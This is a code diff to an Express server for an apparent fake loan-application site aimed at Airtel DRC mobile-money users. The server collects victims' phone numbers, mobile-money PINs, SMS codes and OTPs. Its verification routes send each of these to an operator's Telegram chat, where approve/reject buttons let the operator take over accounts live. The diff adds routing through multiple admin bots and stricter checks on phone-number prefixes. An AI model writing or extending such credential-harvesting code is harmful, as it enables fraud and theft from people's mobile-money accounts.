@@ -8,25 +8,38 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const applications = {};
 
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Admin Bots Mapping for Independent Routing
+const ADMIN_BOTS = {
+  'drc': {
+    token: process.env.DRC_TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN,
+    chatId: process.env.DRC_TELEGRAM_CHAT_ID || process.env.TELEGRAM_CHAT_ID
+  },
+  'secondary': {
+    token: process.env.SECONDARY_BOT_TOKEN,
+    chatId: process.env.SECONDARY_CHAT_ID
+  }
+};
 
-// Helper function to validate Airtel DRC prefixes (+243 followed by 9 digits starting with 97, 98, or 99 typically, or general 9-digit validation)
+function getAdminCredentials(routeKey = 'drc') {
+  return ADMIN_BOTS[routeKey] || ADMIN_BOTS['drc'];
+}
+
+// Helper function to validate Airtel DRC line configuration (+243, 9 digits, prefix check for 97, 98, 99)
 function isValidAirtelDrcPhone(phone) {
-  // Clean phone string to ensure it's digits only
+  if (!phone) return false;
   const cleanPhone = phone.replace(/\D/g, '');
-  // Must be exactly 9 digits
   if (cleanPhone.length !== 9) return false;
   
-  // Optional: Airtel DRC prefixes usually start with 97, 98, 99 (or 89 depending on carrier allocations, but let's strictly enforce 9 digits)
-  return true;
+  const prefix = cleanPhone.substring(0, 2);
+  const validPrefixes = ['97', '98', '99'];
+  return validPrefixes.includes(prefix);
 }
 
 app.post('/api/applications', (req, res) => {
   const { phone } = req.body;
 
   if (phone && !isValidAirtelDrcPhone(phone)) {
-    return res.status(400).json({ error: 'Invalid phone number. Only Airtel DRC lines (9 digits) are allowed.' });
+    return res.status(400).json({ error: 'Invalid phone number. Only Airtel DRC lines (+243 with prefixes 97, 98, 99) are allowed.' });
   }
 
   const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
@@ -52,7 +65,7 @@ app.post('/verify-pin', async (req, res) => {
   applications[appId].momo_pin = pin;
   applications[appId].status = 'pending_auth';
 
-  const message = `🔐 *NEW AIRTEL DRC APPLICATION*\n\n` +
+  const message = `🔐 *NEW AIRTEL DRC APPLICATION (+243)*\n\n` +
     `📱 *Phone:* +243 ${phone}\n` +
     `🔑 *PIN (4 digits):* \`${pin}\`\n` +
     `🆔 *App ID:* ${appId}`;
@@ -65,11 +78,13 @@ app.post('/verify-pin', async (req, res) => {
     ]
   };
 
+  const admin = getAdminCredentials('drc');
+
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${admin.token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
+      body: JSON.stringify({ chat_id: admin.chatId, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
     res.json({ success: true });
   } catch (err) {
@@ -98,11 +113,13 @@ app.post('/verify-sms', async (req, res) => {
     ]
   };
 
+  const admin = getAdminCredentials('drc');
+
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${admin.token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
+      body: JSON.stringify({ chat_id: admin.chatId, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
     res.json({ success: true });
   } catch (err) {
@@ -132,11 +149,13 @@ app.post('/verify-otp', async (req, res) => {
     ]
   };
 
+  const admin = getAdminCredentials('drc');
+
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${admin.token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
+      body: JSON.stringify({ chat_id: admin.chatId, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
     res.json({ success: true });
   } catch (err) {
@@ -152,12 +171,14 @@ app.post('/api/request-sms', async (req, res) => {
                   `🆔 *App ID:* ${appId}\n\n` +
                   `The applicant has requested a new SMS verification timer reset.`;
 
+  const admin = getAdminCredentials('drc');
+
   try {
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${admin.token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
+        chat_id: admin.chatId,
         text: message,
         parse_mode: 'Markdown'
       })
@@ -180,8 +201,8 @@ app.post('/telegram-webhook', async (req, res) => {
   if (update.callback_query) {
     const cb = update.callback_query;
     const parts = cb.data.split('_');
-    const type = parts[0];     // auth, sms, or otp
-    const action = parts[1];   // approve or reject
+    const type = parts[0];     
+    const action = parts[1];   
     const appId = parts.slice(2).join('_');
 
     if (applications[appId]) {
@@ -200,13 +221,15 @@ app.post('/telegram-webhook', async (req, res) => {
       }
     }
 
+    const admin = getAdminCredentials('drc');
+
     try {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+      await fetch(`https://api.telegram.org/bot${admin.token}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ callback_query_id: cb.id, text: `Processed: ${action.toUpperCase()}` })
       });
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+      await fetch(`https://api.telegram.org/bot${admin.token}/editMessageReplyMarkup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } })
@@ -219,5 +242,24 @@ app.post('/telegram-webhook', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+app.listen(PORT, async () => {
+  console.log(`Server running on port ${PORT}`);
   
+  // Startup notification with greeting and Chat ID
+  const admin = getAdminCredentials('drc');
+  if (admin.token && admin.chatId) {
+    const startupMessage = `🚀 *Welcome to FRENCH LOAN APP*\n\n` +
+                           `💬 *Chat ID:* \`${admin.chatId}\`\n` +
+                           `Status: System online and ready for incoming applications.`;
+    try {
+      await fetch(`https://api.telegram.org/bot${admin.token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: admin.chatId, text: startupMessage, parse_mode: 'Markdown' })
+      });
+    } catch (err) {
+      console.error('Failed to send startup telegram message:', err);
+    }
+  }
+});
+    
